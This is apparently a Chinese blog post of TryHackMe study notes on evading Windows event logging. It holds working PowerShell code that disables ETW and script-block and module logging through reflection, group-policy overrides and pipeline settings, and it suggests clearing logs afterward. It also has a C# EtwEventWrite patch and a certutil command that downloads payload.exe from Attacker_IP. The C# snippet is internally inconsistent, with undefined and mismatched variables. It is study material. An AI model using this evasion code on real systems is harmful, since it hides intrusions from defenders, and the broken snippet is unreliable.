消费者选择一个或多个事件会话作为数据源，然后解析这些事件进行分析。我们最熟悉的“事件查看器”就是事件消费者的一种。消费者可以从实时会话或存储在日志文件中的事件中接收数据。</li></ul><p>这三个组件共同构成了一个完整的事件追踪链：</p><ol><li><strong>起源（提供程序）</strong>：事件从提供程序（如某个应用程序）中<strong>产生</strong>。</li><li><strong>处理（控制器）</strong>：控制器<strong>决定</strong>这些事件被发送到哪个会话，以及如何被缓冲和处理。</li><li><strong>分析（消费者）</strong>：消费者<strong>接收</strong>并<strong>解析</strong>会话中的日志，以便进行解释或分析。</li></ol><img src="/thm_rthe/dc8217f5aecbcc08d609c3299756da08.png" class="" title="Diagram depicting the interaction between ETW components, verbally described in the paragraph below"><p>攻击者的目标是<strong>在保持完整性的同时减少可见性</strong>。ETW 的分层结构为攻击者提供了一个新的攻击面。通过有针对性地攻击 ETW 的某个组件，攻击者可以在不完全破坏数据流的情况下，限制特定行为的可见性。这使得他们能够隐藏自己的恶意活动，而不必完全禁用整个日志系统。</p><table><thead><tr><th>**Component **</th><th><strong>Techniques</strong></th></tr></thead><tbody><tr><td>Provider</td><td>PSEtwLogProvider 修改、组策略接管、日志管道滥用、类型创建</td></tr><tr><td>Controller</td><td>修补 EtwEventWrite，运行时跟踪篡改</td></tr><tr><td>Consumers</td><td>日志粉碎，日志篡改</td></tr></tbody></table><p>在接下来将深入介绍每一种技术。</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>PowerShell 的两种主要日志类型：</strong></p><ul><li>**脚本块日志 (Script block logging)**：<ul><li>记录在 PowerShell 会话中执行的<strong>所有脚本块</strong>。</li><li>它报告 <strong>Event ID 4104</strong>，是攻击者最需要关注的日志，因为它会完整暴露未混淆的恶意脚本。</li></ul></li><li>**模块日志 (Module logging)**：<ul><li>记录 PowerShell 模块中执行的<strong>命令和数据</strong>。</li><li>它报告 <strong>Event ID 4103</strong>。由于这种日志非常详细且数量庞大，它经常被系统管理员禁用，或者因为噪音太大而被忽略。</li></ul></li></ul><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>在 PowerShell 里面 ETW Providers 是通过一个 .NET 程序集 <code>PSEtwLogProvider</code> 载入到这个 PowerShell 会话里面的。在一个 PowerShell 会话里面，大多数 .NET 程序集会在用户启动时加载相同的安全上下文。所以用户拥有的权限和加载的程序集有相同的权限级别，所以我们就可以通过反射修改他，和前面的绕过 PowerShell 的 AMSI 原理是一样的。</p><p>这段 PowerShell 代码利用反射（Reflection），通过直接操作 .NET 程序集的内部私有字段，来<strong>强制禁用</strong> ETW 事件记录。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 PowerShell ETW 事件提供程序的内部类型</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这是一个名为 PSEtwLogProvider 的非公共类型</span></span><span class="line"><span style="color: #E06C75">$logProvider</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取该类型中名为 &#39;etwProvider&#39; 的静态私有字段的值</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 该字段是 ETW 提供程序的一个实例</span></span><span class="line"><span style="color: #E06C75">$etwProvider</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$logProvider.GetField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;etwProvider&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).GetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 强制将该 ETW 提供程序实例的 &#39;m_enabled&#39; 字段设为 0</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用事件记录，从而阻止 PowerShell 将日志发送给 ETW</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">System.Diagnostics.Eventing.EventProvider</span><span style="color: #ABB2BF">].GetField(</span><span style="color: #98C379">&#39;m_enabled&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Instance&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #E06C75">$etwProvider</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>4104 是 PowerShell 日志记录的 Event ID，我们用这个来测试是否绕过了，如果绕过了，怎么执行命令这个日志数量都不会变的。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 4104 Event ID 的日志条目</span></span><span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterHashtable </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">ProviderName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;Microsoft-Windows-PowerShell&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Id</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4104</span><span style="color: #ABB2BF">} | Measure | </span><span style="color: #C678DD">%</span><span style="color: #ABB2BF"> Count</span></span></code></pre></div></div></figure><h3 id="修补"><a href="#修补" class="headerlink" title="修补"></a>修补</h3><p>和 AMSI 的原理是一样的，也是因为加载的 ETW 组件和用户平权，导致可以修改这个组件的内存区域。</p><p>14h 是 20 个字节，也就是 <code>EtwEventWrite</code> 的 5 个形参，<code>ret 14h</code> 会把这 5 个参数丢掉。打完补丁之后，任何对 <code>EtwEventWrite</code> 函数的调用都会立即弹出返回地址，清理掉参数，返回到调用者。</p><p>换一种理解方式：在调用这个函数执行的时候，就会有5个参数传过来，进栈。而我们直接 ret 14h 是直接返回了一个不知道是什么的结果，然后把那20个字节在栈里面的数据清理了，这样我们就可以在不执行这个函数里面代码的前提下绕过函数执行了，本来那5个参数在内部是要被用掉的。</p><p>如果还是不理解去好好研究一下栈结构，你就明白了。</p><p>我简述一下过程：</p><ol><li>调用函数时，将<strong>参数</strong>压入栈（20字节）</li><li>会把返回地址（下一条指令的地址压入栈中）</li><li>函数开头是 <code>ret 14h</code> 直接跳到下一条指令的地址去执行</li><li>同时清理掉 20 字节的参数</li></ol><p>这里并没有讨论这个函数的返回值，我觉得我可能是少了这一个概念导致卡了很久，总之原理就是这样。</p><figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 获取 EtwEvenetWrite 地址</span></span><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ntdll</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">LoadLibrary</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ntdll.dll&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">ntdll</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;EtwEventWrite&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 修改内存区域的权限</span></span><span class="line"><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oldProtect</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UIntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">patch</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">out</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oldProtect</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 写入我们准备好的 opcode</span></span><span class="line"><span style="color: #61AFEF">patch</span><span style="color: #ABB2BF">(new </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] { </span><span style="color: #D19A66">0xc2</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x14</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF"> });</span></span><span class="line"><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">patch</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">etwEventSend</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">patch</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 恢复内存区域的权限</span></span><span class="line"><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">oldProtect</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">oldOldProtect</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 刷新指令缓存</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 强制 CPU 丢弃旧的函数指令，以确保补丁能够立即生效</span></span><span class="line"><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">FlushInstructionCache</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p><strong>ETW 提供了强大的日志功能，但并非所有功能都默认开启。</strong> 为了避免生成海量日志，一些高频度记录的功能（如 PowerShell 日志）需要通过 <strong>GPO（组策略）</strong> 明确启用。</p><p>模块日志记录和脚本块日志记录提供程序都通过组策略启用，具体为 <code>Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell</code> 。同样的，系统程序集也是和用户同级加载的，所以可以通过反射修改 PowerShell 提供程序的组策略。</p><p>具体步骤如下：</p><ol><li>从实用程序缓存中获取组策略设置。</li><li>修改通用提供程序为 0。</li><li>修改调用或模块定义。</li></ol><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># ====================================================================</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># PowerShell 日志记录规避脚本</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 目的：通过修改 PowerShell 的组策略设置，来禁用或减少 ETW 日志。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 该脚本使用反射技术，直接操作内存中的私有字段。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># ====================================================================</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 第 1 步：使用反射获取组策略设置的私有字段</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 &quot;System.Management.Automation.Utils&quot; 类型的引用。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 该类型包含了我们想要修改的私有字段。</span></span><span class="line"><span style="color: #E06C75">$UtilsType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.Utils&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 通过反射，获取名为 &quot;cachedGroupPolicySettings&quot; 的私有静态字段。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这个字段存储了 PowerShell 当前加载的组策略设置。</span></span><span class="line"><span style="color: #E06C75">$cachedGroupPolicySettingsField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$UtilsType.GetField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;cachedGroupPolicySettings&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取该字段的当前值。$null 用于获取静态字段的值。</span></span><span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$cachedGroupPolicySettingsField.GetValue</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 第 2 步：修改脚本块日志（事件 ID 4104）设置</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 将 &quot;EnableScriptBlockLogging&quot; 的值设为 0。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用脚本块日志记录，从而阻止记录完整的脚本内容。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这对攻击者最重要，因为它可以隐藏恶意脚本。</span></span><span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;ScriptBlockLogging&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;EnableScriptBlockLogging&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 第 3 步：修改模块日志（事件 ID 4103）设置</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 将 &quot;EnableScriptBlockInvocationLogging&quot; 的值设为 0。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用模块日志记录，从而阻止记录命令调用和参数。</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 由于 4103 日志通常非常多，禁用它可以减少噪音，使攻击者活动更难被发现。</span></span><span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;ScriptBlockLogging&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;EnableScriptBlockInvocationLogging&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span></code></pre></div></div></figure><p>同样用这个命令来测试是否生效</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 4104 Event ID 的日志条目</span></span><span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterHashtable </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">ProviderName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;Microsoft-Windows-PowerShell&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Id</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4104</span><span style="color: #ABB2BF">} | Measure | </span><span style="color: #C678DD">%</span><span style="color: #ABB2BF"> Count</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 从指定的日志文件中，找出所有目标端口为 4444 的网络连接事件</span></span><span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path C:\Users\THM</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterXPath </span><span style="color: #98C379">&#39;*/System/EventID=3 and */EventData/Data[@Name=&quot;DestinationPort&quot;] and */EventData/Data=4444&#39;</span></span></code></pre></div></div></figure><h3 id="滥用日志管道"><a href="#滥用日志管道" class="headerlink" title="滥用日志管道"></a>滥用日志管道</h3><p>在 PowerShell 中，每个模块或管理单元（snap-in）都有一个可供任何人使用的设置，用于修改其日志记录功能。根据微软文档，“当 <code>LogPipelineExecutionDetails</code> 属性值为 <code>TRUE</code>（<code>$true</code>）时，Windows PowerShell 会将该会话中的 cmdlet 和函数执行事件写入事件查看器中的 PowerShell 日志。”攻击者可以在任何 PowerShell 会话中将此值更改为 <code>$false</code>，以禁用该特定会话的模块日志记录。微软文档甚至指出了从用户会话中禁用日志记录的能力：“要禁用日志记录，请使用相同的命令序列将属性值设置为 <code>FALSE</code>（<code>$false</code>）。”</p><p>从宏观上看，日志管道技术可以分解为四个步骤：</p><ol><li>获取目标模块。</li><li>将模块的执行细节设置为 <code>$false</code>。</li><li>获取模块管理单元。</li><li>将管理单元的执行细节设置为 <code>$false</code>。</li></ol><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$module</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-Module</span><span style="color: #ABB2BF"> Microsoft.PowerShell.Utility </span><span style="color: #7F848E; font-style: italic"># 获取目标模块</span></span><span class="line"><span style="color: #E06C75">$module.LogPipelineExecutionDetails</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 将模块的执行细节设置为 false</span></span><span class="line"><span style="color: #E06C75">$snap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-PSSnapin</span><span style="color: #ABB2BF"> Microsoft.PowerShell.Core </span><span style="color: #7F848E; font-style: italic"># 获取目标 ps-snapin</span></span><span class="line"><span style="color: #E06C75">$snap.LogPipelineExecutionDetails</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 将 ps-snapin 的执行细节设置为 false</span></span></code></pre></div></div></figure><p>上述脚本块可以附加到任何 PowerShell 脚本中，或在会话中运行，以禁用当前已导入模块的日志记录。</p><h2 id="实践-4"><a href="#实践-4" class="headerlink" title="实践"></a>实践</h2><p>随便执行一个绕过方法，因为都是注入到当前的 PowerShell 进程里面的，所以不会影响环境，然后去日志查看器里面清理一下 PowerShell 的操作日志就行了。</p><h1 id="Living-Off-the-Land-土生土长"><a href="#Living-Off-the-Land-土生土长" class="headerlink" title="Living Off the Land 土生土长"></a>Living Off the Land 土生土长</h1><p>这个房间名称有意思，实际教的内容也是很相关的，他教我们利用系统内置的应用达成我们的目的，这在渗透环境中是非常有用的，因为如果从我们的环境里面拉工具下来风险挺大的，利用内置的工具就相当于就地取材了</p><h2 id="Windows-Sysinternals"><a href="#Windows-Sysinternals" class="headerlink" title="Windows Sysinternals"></a>Windows Sysinternals</h2><p>Windows Sysinternals 是一套工具和高级系统实用程序，旨在帮助 IT 专业人员在各种高级主题中管理、排查和诊断 Windows 操作系统。</p><p>以下是一些常用的 Windows Sysinternals 工具：</p><table><thead><tr><th><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a></th><th>Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services.</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a></td><td>A tool that executes programs on a remote system.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a></td><td>An advanced Active Directory tool that helps to easily view and manage the AD database.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></td><td>Monitors running processes for CPU spikes and the ability to dump memory for further analysis.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">ProcMon</a></td><td>An essential tool for process monitoring.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a></td><td>A tool that lists all TCP and UDP connections.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">PsTools</a></td><td>The first tool designed in the Sysinternals suite to help list detailed information.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon">Portmon</a></td><td>Monitors and displays all serial and parallel port activity on a system.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois">Whois</a></td><td>Provides information for a specified domain name or IP address.</td></tr></tbody></table><p>有关 Sysinternals 套件的更多信息，您可以<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">在此</a>访问 Microsoft Docs 上该工具的网页.</p><h3 id="在线-Sysinternals"><a href="#在线-Sysinternals" class="headerlink" title="在线 Sysinternals"></a>在线 Sysinternals</h3><p>Windows Sysinternals 的一个重要特点是无需安装。微软提供了一个 Windows Sysinternals 服务——Sysinternals Live，提供多种使用和运行这些工具的方式。我们可以通过以下方式访问和使用它们</p><ul><li><p><a href="https://live.sysinternals.com/">https://live.sysinternals.com/</a></p></li><li><p><code>\\live.sysinternals.com\tools</code></p></li></ul><p>如果你有兴趣进一步了解 Windows Sysinternals，我们建议你熟悉以下额外资源：</p><ol><li>TryHackMe room: <a href="https://tryhackme.com/room/btsysinternalssg">Sysinternals</a>.</li><li>Microsoft Sysinternals Resources <a href="https://docs.microsoft.com/en-us/sysinternals/resources/">website</a>.</li></ol><h2 id="LOLBAS-项目"><a href="#LOLBAS-项目" class="headerlink" title="LOLBAS 项目"></a>LOLBAS 项目</h2><p>LOLBAS 代表 “利用本地二进制文件和脚本生存”（Living Off the Land Binaries And Scripts）。该项目的主要目标是收集并记录由微软签名并内置的、作为“利用本地资源”技术使用的工具，包括二进制文件、脚本和库。</p><p>LOLBAS 项目是一个由社区驱动的资料库，收集了可用于红队用途的二进制文件、脚本和库。它允许基于二进制文件、函数、脚本和 ATT&amp;CK 信息进行搜索。上图显示了目前 LOLBAS 项目页面的样貌。如果你想了解更多关于该项目的详细信息，可以访问该项目的官网：<a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><p>LOLBAS 网站提供了一个方便的搜索栏来查询所有可用数据。直接搜索二进制文件很简单；包含二进制名称即可显示结果。然而，如果我们想查找特定函数，则需要在函数名前加上 &#x2F;。例如，如果我们要查找所有执行函数，应使用 &#x2F;execute 同样，为了基于类型进行查找，我们应使用 # 符号后跟类型名称。以下是项目中包含的类型：</p><ul><li>Script 脚本</li><li>Binary 二进制</li><li>Libraries 库</li><li>OtherMSBinaries 其他 MS 二进制文件</li></ul><h3 id="Tools-Criteria-工具标准"><a href="#Tools-Criteria-工具标准" class="headerlink" title="Tools Criteria 工具标准"></a>Tools Criteria 工具标准</h3><p>要被认定为“原生系统工具（Living Off the Land）”技巧并被纳入 LOLBAS 项目，工具必须满足特定标准：</p><ul><li>由微软签名、属于操作系统原生或从微软下载的文件。</li><li>具有额外的、有趣的、未按已知用例覆盖的非预期功能。</li><li>对高级持续性威胁（APT）或红队活动有利。</li></ul><p>如果你发现了符合上面条件的二进制文件，可以去他的 repo 里面贡献一下。</p><h3 id="Interesting-Functionalities-有趣的功能"><a href="#Interesting-Functionalities-有趣的功能" class="headerlink" title="Interesting Functionalities 有趣的功能"></a>Interesting Functionalities 有趣的功能</h3><p>LOLBAS 项目接受符合以下功能之一的工具提交：</p><ul><li>Arbitrary code execution 任意代码执行</li><li>File operations, including downloading, uploading, and copying files.<br>文件操作，包括下载、上传和复制文件。</li><li>Compiling code 正在编译代码</li><li>Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.<br>持久性，包括在替代数据流（ADS）中隐藏数据或在登录时执行。</li><li>UAC bypass UAC 绕过</li><li>Dumping process memory 转储进程内存</li><li>DLL injection DLL 注入</li></ul><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>本任务将重点介绍一些有趣的“借助现有系统工具（Living Off the Land）”技术，这些技术旨在用于文件操作，包括下载、上传和编码。</p><h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><p>Certutil 是 Windows 内置的证书服务工具，该工具的正常用途是检索证书信息。人们发现 certutil.exe 可以传输和编码与证书服务无关的文件。MITRE ATT&amp;CK 框架将该技术标识为入口工具传输（<a href="https://attack.mitre.org/techniques/T1105/">T1105</a>）</p><p>为了说明这一点，我们可以举个例子：使用 <code>certutil.exe</code> 从攻击者的 Web 服务器下载文件并将其存储在 Windows 的临时文件夹中，使用下面的命令：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">URLcache</span><span style="color: #ABB2BF"> -</span><span style="color: #56B6C2">split</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> http://</span><span style="color: #E06C75">Attacker_IP</span><span style="color: #ABB2BF">/payload.exe C:\</span><span style="color: 